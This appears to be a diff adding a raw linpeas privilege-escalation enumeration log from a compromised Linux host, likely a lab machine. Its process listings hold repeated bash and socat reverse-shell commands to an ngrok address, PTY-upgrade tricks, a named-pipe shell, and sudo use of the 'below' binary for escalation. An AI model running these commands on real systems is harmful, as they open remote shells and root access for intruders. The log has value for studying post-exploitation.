+www-data    8764  0.0  0.1   2716  1664 ?        S    13:39   0:00  |               _ script -qc /bin/bash /dev/null
+www-data    8765  0.0  0.1   2800  1536 pts/13   Ss   13:39   0:00  |                   _ sh -c /bin/bash
+www-data    8766  0.0  0.2   4588  2432 pts/13   S    13:39   0:00  |                       _ /bin/bash
+www-data    8850  0.0  0.5  15260  4864 pts/13   S+   13:39   0:00  |                           _ python3 -c import pty; pty.spawn("/bin/bash")
+www-data    8851  0.0  0.2   4972  2688 pts/14   Ss   13:39   0:00  |                               _ /bin/bash
+root        8885  0.0  0.2   7112  2380 pts/14   S    13:39   0:00  |                                   _ su adalberto
+adalber+    8886  0.0  0.2   5020  2816 pts/14   S    13:39   0:00  |                                       _ bash
+adalber+    9074  0.2  0.2   3628  2560 pts/14   S+   13:40   0:00  |                                           _ /bin/sh ./linpeas.sh
+adalber+   11186  0.0  0.1   3628  1440 pts/14   S+   13:42   0:00  |                                               _ /bin/sh ./linpeas.sh
+adalber+   11190  0.0  0.4   8332  4352 pts/14   R+   13:42   0:00  |                                               |   _ ps fauxwww
+adalber+   11189  0.0  0.1   3628  1568 pts/14   S+   13:42   0:00  |                                               _ /bin/sh ./linpeas.sh
+www-data    8051  0.0  0.7 204472  7108 ?        S    13:35   0:00  _ /usr/sbin/apache2 -k start
+mysql         66  0.0  0.1   2800  1536 ?        S    13:13   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql        225  0.6 38.2 1787532 359320 ?      Sl   13:13   0:11  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=ip-10-0-163-175.pid
+
+╔══════════╣ Processes with unusual configurations
+Process 1 (root) - bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 26 (root) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 43 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 44 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 45 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 46 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 47 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 66 (mysql) - /bin/sh /usr/bin/mysqld_safe 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 225 (mysql) - /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-er
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 403 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 404 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 405 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 406 (www-data) - sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1' 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 407 (www-data) - bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 408 (www-data) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 410 (www-data) - python3 -c import pty; pty.spawn("/bin/bash") 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 411 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 413 (www-data) - script -qc /bin/bash /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 414 (www-data) - sh -c /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 415 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 418 (root) - su adalberto 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 419 (adalberto) - bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 422 (adalberto) - script -qc /bin/bash /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 423 (adalberto) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 431 (adalberto) - bash -c trap /tmp/x.sh SIGUSR1; sleep 999999 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 432 (adalberto) - sleep 999999 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 433 (root) - sudo /usr/local/bin/below 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 434 (root) - sudo /usr/local/bin/below 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 435 (root) - /usr/local/bin/below 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1740 (www-data) - sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1' 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1741 (www-data) - bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1742 (www-data) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1792 (www-data) - python3 -c import pty; pty.spawn("/bin/bash") 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1793 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1843 (root) - su adalberto 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 1844 (adalberto) - bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 2430 (adalberto) - ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 2431 (adalberto) - bash -li 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3036 (www-data) - sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1' 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3037 (www-data) - bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3038 (www-data) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3296 (www-data) - python3 -c import pty; pty.spawn("/bin/bash") 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3297 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3332 (www-data) - script -qc /bin/bash /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3333 (www-data) - sh -c /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3334 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3418 (www-data) - /tmp/socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3596 (www-data) - sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1' 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3597 (www-data) - bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3598 (www-data) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3616 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3649 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3714 (www-data) - python3 -c import pty; pty.spawn("/bin/bash") 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3715 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3749 (root) - su adalberto 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3766 (adalberto) - bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3801 (adalberto) - script -qc /bin/bash /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3802 (adalberto) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3857 (adalberto) - cat /tmp/f 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3858 (adalberto) - /bin/bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3859 (adalberto) - script -q /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 3860 (adalberto) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8051 (www-data) - /usr/sbin/apache2 -k start 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8728 (www-data) - sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1' 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8729 (www-data) - bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8730 (www-data) - bash -i 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8764 (www-data) - script -qc /bin/bash /dev/null 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8765 (www-data) - sh -c /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8766 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8850 (www-data) - python3 -c import pty; pty.spawn("/bin/bash") 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8851 (www-data) - /bin/bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8885 (root) - su adalberto 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 8886 (adalberto) - bash 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+Process 9074 (adalberto) - /bin/sh ./linpeas.sh 
+SELinux context: docker-default (enforce)
+  └─ AppArmor profile: docker-default (enforce)
+
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                     
+gdm-password Not Found                                                                                                                                                
+gnome-keyring-daemon Not Found                                                                                                                                        
+lightdm Not Found                                                                                                                                                     
+vsftpd Not Found                                                                                                                                                      
+apache2 process found (dump creds from memory as root)                                                                                                                
+sshd: Not Found
+mysql process found (dump creds from memory as root)                                                                                                                  
+postgres Not Found
+redis-server Not Found                                                                                                                                                
+mongod Not Found                                                                                                                                                      
+memcached Not Found                                                                                                                                                   
+elasticsearch Not Found                                                                                                                                               
+jenkins Not Found                                                                                                                                                     
+tomcat Not Found                                                                                                                                                      
+nginx Not Found                                                                                                                                                       
+php-fpm Not Found                                                                                                                                                     
+supervisord Not Found
+vncserver Not Found                                                                                                                                                   
+xrdp Not Found                                                                                                                                                        
+teamviewer Not Found                                                                                                                                                  
+                                                                                                                                                                      
+╔══════════╣ Opened Files by processes
+Process 419 (adalberto) - bash 
+  └─ Has open files:
+    └─ /dev/pts/2
+Process 422 (adalberto) - script -qc /bin/bash /dev/null 
+  └─ Has open files:
+    └─ /dev/pts/2
+    └─ /dev/pts/ptmx
+    └─ /dev/pts/3
+Process 423 (adalberto) - /bin/bash 
+  └─ Has open files:
+    └─ /dev/pts/3
+Process 431 (adalberto) - bash -c trap /tmp/x.sh SIGUSR1; sleep 999999 
+  └─ Has open files:
+    └─ /dev/pts/3
+Process 432 (adalberto) - sleep 999999 
+  └─ Has open files:
+    └─ /dev/pts/3
+Process 1844 (adalberto) - bash 
+  └─ Has open files:
+    └─ /dev/pts/5
+Process 2430 (adalberto) - ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908 
+  └─ Has open files:
+    └─ /dev/pts/5
+    └─ /dev/pts/ptmx
+Process 2431 (adalberto) - bash -li 
+  └─ Has open files:
+    └─ /dev/pts/6
+    └─ /dev/pts/5
+Process 3766 (adalberto) - bash 
+  └─ Has open files:
+    └─ /dev/pts/10
+Process 3801 (adalberto) - script -qc /bin/bash /dev/null 
+  └─ Has open files:
+    └─ /dev/pts/10
+    └─ /dev/pts/ptmx
+    └─ /dev/pts/11
+Process 3802 (adalberto) - /bin/bash 
+  └─ Has open files:
+    └─ /dev/pts/11
+Process 3857 (adalberto) - cat /tmp/f 
+  └─ Has open files:
+    └─ /dev/pts/11
+    └─ pipe:[15959]
+    └─ /tmp/f
+Process 3858 (adalberto) - /bin/bash -i 
+  └─ Has open files:
+    └─ pipe:[15959]
+    └─ pipe:[15961]
+    └─ /dev/tty
+Process 3859 (adalberto) - script -q /dev/null 
+  └─ Has open files:
+    └─ pipe:[15961]
+    └─ /tmp/f
+    └─ /dev/pts/11
+    └─ /dev/pts/ptmx
+    └─ /dev/pts/12
+Process 3860 (adalberto) - bash -i 
+  └─ Has open files:
+    └─ /dev/pts/12
+Process 8886 (adalberto) - bash 
+  └─ Has open files:
+    └─ /dev/pts/14
+
+╔══════════╣ Processes with memory-mapped credential files
+
+╔══════════╣ Processes whose PPID belongs to a different user (not root)
+╚ You will know if a user can somehow spawn processes as a different user                                                                                             
+Proc 419 with ppid 418 is run by user adalberto but the ppid user is www-data
+Proc 435 with ppid 434 is run by user root but the ppid user is adalberto
+Proc 1844 with ppid 1843 is run by user adalberto but the ppid user is www-data
+Proc 3766 with ppid 3749 is run by user adalberto but the ppid user is www-data
+Proc 8886 with ppid 8885 is run by user adalberto but the ppid user is www-data
+
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information                                                                    
+
+╔══════════╣ Check for vulnerable cron jobs
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                  
+══╣ Cron jobs list
+crontab Not Found                                                                                                                                                     
+incrontab Not Found                                                                                                                                                   
+/etc/cron.d:                                                                                                                                                          
+total 16
+drwxr-xr-x 1 root root 4096 Jan  7 19:09 .
+drwxr-xr-x 1 root root 4096 Feb 14 13:12 ..
+-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all
+-rw-r--r-- 1 root root  712 Jan 18  2024 php
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x 1 root root 4096 Jan 11 14:32 .
+drwxr-xr-x 1 root root 4096 Feb 14 13:12 ..
+-rwxr-xr-x 1 root root  539 Mar 18  2024 apache2
+-rwxr-xr-x 1 root root 1478 Mar 22  2024 apt-compat
+-rwxr-xr-x 1 root root  123 Feb  4  2024 dpkg
+
+══╣ Checking for specific cron jobs vulnerabilities
+Checking cron directories...
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                              
+══╣ Active timers:                                                                                                                                                    
+══╣ Disabled timers:                                                                                                                                                  
+══╣ Additional timer files:
+
+╔══════════╣ Services and Service Files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
+                                                                                                                                                                      
+══╣ Active services:
+                                                                                                                                                                      
+══╣ Disabled services:
+apache-htcacheclean.service                  disabled enabled
+apache-htcacheclean@.service                 disabled enabled
+apache2@.service                             disabled enabled
+console-getty.service                        disabled disabled
+debug-shell.service                          disabled disabled
+rsync.service                                disabled enabled
+serial-getty@.service                        disabled enabled
+systemd-boot-check-no-failures.service       disabled disabled
+systemd-confext.service                      disabled enabled
+systemd-network-generator.service            disabled enabled
+systemd-networkd-wait-online.service         disabled enabled
+systemd-networkd-wait-online@.service        disabled enabled
+systemd-networkd.service                     disabled enabled
+systemd-pcrlock-file-system.service          disabled enabled
+systemd-pcrlock-firmware-code.service        disabled enabled
+systemd-pcrlock-firmware-config.service      disabled enabled
+systemd-pcrlock-machine-id.service           disabled enabled
+systemd-pcrlock-make-policy.service          disabled enabled
+systemd-pcrlock-secureboot-authority.service disabled enabled
+systemd-pcrlock-secureboot-policy.service    disabled enabled
+systemd-sysext.service                       disabled enabled
+systemd-time-wait-sync.service               disabled disabled
+22 unit files listed.
+
+══╣ Additional service files:
+  Potential issue in service file: /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libbpf-sys-1.6.2+v1.6.2/elfutils/config/debuginfod.service
+  └─ WRITABLE_FILE: Service file is writable
+  Potential issue in service file: /usr/lib/systemd/system/dbus.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/getty-static.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/getty.target.wants/getty-static.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/initrd-cleanup.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/initrd-parse-etc.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/initrd-switch-root.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/initrd-udevadm-cleanup-db.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+  Potential issue in service file: /usr/lib/systemd/system/multi-user.target.wants/dbus.service
+  └─ RELATIVE_PATH: Could be executing some relative path
+You can't write on systemd PATH
+
+╔══════════╣ Systemd Information
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                       
+═╣ Systemd version and vulnerabilities? .............. 255.4                                                                                                          
+8.12
+═╣ Services running as root? ..... 
+═╣ Running services with dangerous capabilities? ... 
+═╣ Services with writable paths? . 
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                       
+                                                                                                                                                                      
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                             
+
+╔══════════╣ Unix Sockets Analysis
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                             
+
+╔══════════╣ D-Bus Analysis
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                               
+busctl Not Found                                                                                                                                                      
+                                                                                                                                                                      
+╔══════════╣ D-Bus Configuration Files
+Analyzing /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf:                                                                                                    
+  └─(Allow rules in default context)
+             └─     <allow send_destination="com.ubuntu.SoftwareProperties"
+            <allow send_destination="com.ubuntu.SoftwareProperties"
+            <allow send_destination="com.ubuntu.DeviceDriver"
+
+══╣ D-Bus Session Bus Analysis
+(Access to session bus available)
+
+
+╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust
+                                                                                                                                                                      
+══╣ Listening r-services (TCP 512-514)
+ss|netstat Not Found                                                                                                                                                  
+                                                                                                                                                                      
+══╣ systemd units exposing r-services
+rlogin|rsh|rexec units Not Found                                                                                                                                      
+                                                                                                                                                                      
+══╣ inetd/xinetd configuration for r-services
+/etc/inetd.conf Not Found                                                                                                                                             
+/etc/xinetd.d Not Found                                                                                                                                               
+                                                                                                                                                                      
+══╣ Installed r-service server packages
+  No related packages found via dpkg                                                                                                                                  
+
+══╣ /etc/hosts.equiv and /etc/shosts.equiv
+                                                                                                                                                                      
+══╣ Per-user .rhosts files
+.rhosts Not Found                                                                                                                                                     
+                                                                                                                                                                      
+══╣ PAM rhosts authentication
+/etc/pam.d/rlogin|rsh Not Found                                                                                                                                       
+                                                                                                                                                                      
+══╣ SSH HostbasedAuthentication
+/etc/ssh/sshd_config Not Found                                                                                                                                        
+                                                                                                                                                                      
+══╣ Potential DNS control indicators (local)
+  Not detected
+
+╔══════════╣ Crontab UI (root) misconfiguration checks
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                  
+crontab-ui Not Found                                                                                                                                                  
+                                                                                                                                                                      
+
+                              ╔═════════════════════╗                                                                                                                 
+══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                   
+                              ╚═════════════════════╝                                                                                                                 
+╔══════════╣ Interfaces
+# symbolic names for networks, see networks(5) for more information                                                                                                   
+link-local 169.254.0.0
+Network Interfaces from /proc/net/dev:
+----------------------------------------
+Interface: lo
+  MAC: 00:00:00:00:00:00
+  State: unknown
+
+Interface: ens5
+  MAC: 02:8a:0a:66:df:69
+  State: up
+
+Interface: docker0
+  MAC: 02:42:f7:d5:7b:f4
+  State: down
+
+Additional IP Information from fib_trie:
+----------------------------------------
+Network: 
+══╣ Forwarding status
+net.ipv4.ip_forward = 1
+net.ipv6.conf.all.forwarding = 0
+
+╔══════════╣ Hostname, hosts and DNS
+══╣ Hostname Information                                                                                                                                              
+System hostname: ip-10-0-163-175                                                                                                                                      
+FQDN: ip-10-0-163-175
+
+══╣ Hosts File Information
+Contents of /etc/hosts:                                                                                                                                               
+  127.0.0.1 localhost
+  ::1 ip6-localhost ip6-loopback
+  fe00::0 ip6-localnet
+  ff00::0 ip6-mcastprefix
+  ff02::1 ip6-allnodes
+  ff02::2 ip6-allrouters
+  ff02::3 ip6-allhosts
+
+══╣ DNS Configuration
+DNS Servers (resolv.conf):                                                                                                                                            
+  127.0.0.53
+  search ec2.internal
+-e 
+Systemd-resolved configuration:
+  [Resolve]
+-e 
+DNS Domain Information:
+(none)
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                          
+══╣ Active tcp Ports (from /proc/net/tcp)                                                                                                                             
+Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name                                                                     
+--------------------------------------------------------------------------------
+tcp    00:00000000 00000000:00000000 127.0.0.54:53         0.0.0.0:0             LISTEN       /
+tcp    00:00000000 00000000:00000000 127.0.0.1:33060       0.0.0.0:0             LISTEN       /
+tcp    00:00000000 00000000:00000000 0.0.0.0:3306          0.0.0.0:0             LISTEN       /
+tcp    00:00000000 00000000:00000000 127.0.0.53:53         0.0.0.0:0             LISTEN       /
+
+══╣ Active udp Ports (from /proc/net/udp)
+Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name                                                                     
+--------------------------------------------------------------------------------
+
+══╣ Local-only listeners (loopback)
+══╣ Unique listener bind addresses                                                                                                                                    
+══╣ Potential local forwarders/relays                                                                                                                                 
+adalber+    2430 95.7  0.0    536     0 pts/5    R+   13:27  15:12 ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908                    
+www-data    3418 93.6  0.0    536   128 pts/8    R+   13:32  10:09 /tmp/socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908
+adalber+   26766  0.0  0.2   4032  2048 pts/14   S+   13:43   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g
+
+╔══════════╣ Network Traffic Analysis Capabilities
+                                                                                                                                                                      
+══╣ Available Sniffing Tools
+No sniffing tools found                                                                                                                                               
+
+══╣ Network Interfaces Sniffing Capabilities
+Interface docker0: Not sniffable                                                                                                                                      
+Interface ens5: Not sniffable
+Interface lo (loopback): Not sniffable
+No sniffable interfaces found
+
+══╣ Running sniffing/traffic reconstruction processes
+                                                                                                                                                                      
+╔══════════╣ Firewall Rules Analysis
+                                                                                                                                                                      
+══╣ Iptables Rules
+iptables Not Found                                                                                                                                                    
+                                                                                                                                                                      
+══╣ Nftables Rules
+nftables Not Found                                                                                                                                                    
+                                                                                                                                                                      
+══╣ Firewalld Rules
+firewalld Not Found                                                                                                                                                   
+                                                                                                                                                                      
+══╣ UFW Rules
+ufw Not Found                                                                                                                                                         
+                                                                                                                                                                      
+══╣ Forwarding and rp_filter
+net.ipv4.ip_forward = 1
+net.ipv6.conf.all.forwarding = 0
+net.ipv4.conf.all.rp_filter = 2
+
+╔══════════╣ Inetd/Xinetd Services Analysis
+                                                                                                                                                                      
+══╣ Inetd Services
+inetd Not Found                                                                                                                                                       
+                                                                                                                                                                      
+══╣ Xinetd Services
+xinetd Not Found                                                                                                                                                      
+                                                                                                                                                                      
+══╣ Running Inetd/Xinetd Services
+-e                                                                                                                                                                    
+Running Service Processes:
+
+╔══════════╣ Internet Access?
+  ping not found                                                                                                                                                      
+Port 80 is accessible
+Port 443 is accessible
+Port 443 is accessible with curl
+DNS is not accessible
+
+╔══════════╣ Is hostname malicious or leaked?
+╚ This will check the public IP and hostname in known malicious lists and leaks to find any relevant information about the host.
+{
+  "malicious": false
+}
+══╣ Proxy discovery
+╚ Checking common proxy env vars and apt proxy config                                                                                                                 
+                                                                                                                                                                      
+
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                   
+                               ╚═══════════════════╝                                                                                                                  
+╔══════════╣ My user
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                               
+uid=1001(adalberto) gid=1001(adalberto) groups=1001(adalberto)                                                                                                        
+
+╔══════════╣ PGP Keys and Related Files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                            
+GPG:                                                                                                                                                                  
+GPG is installed, listing keys:
+-e 
+NetPGP:
+netpgpkeys Not Found
+-e                                                                                                                                                                    
+PGP Related Files:
+Found: /home/adalberto/.gnupg
+total 16
+drwx------ 2 adalberto adalberto 4096 Feb 14 13:43 .
+drwxr-x--- 1 adalberto adalberto 4096 Feb 14 13:43 ..
+-rw------- 1 adalberto adalberto   32 Feb 14 13:43 pubring.kbx
+-rw------- 1 adalberto adalberto 1200 Feb 14 13:43 trustdb.gpg
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                       
+Matching Defaults entries for adalberto on ip-10-0-163-175:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User adalberto may run the following commands on ip-10-0-163-175:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/below *, !/usr/local/bin/below --config*, !/usr/local/bin/below --debug*, !/usr/local/bin/below -d*
+Matching Defaults entries for adalberto on ip-10-0-163-175:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User adalberto may run the following commands on ip-10-0-163-175:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/below *, !/usr/local/bin/below --config*, !/usr/local/bin/below --debug*, !/usr/local/bin/below -d*
+
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                 
+ptrace protection is enabled (1)
+Sudo token directory perms:
+drwx------ 2 root root 4096 Feb 14 13:24 /var/run/sudo/ts
+
+doas.conf Not Found
+                                                                                                                                                                      
+╔══════════╣ Checking Pkexec and Polkit
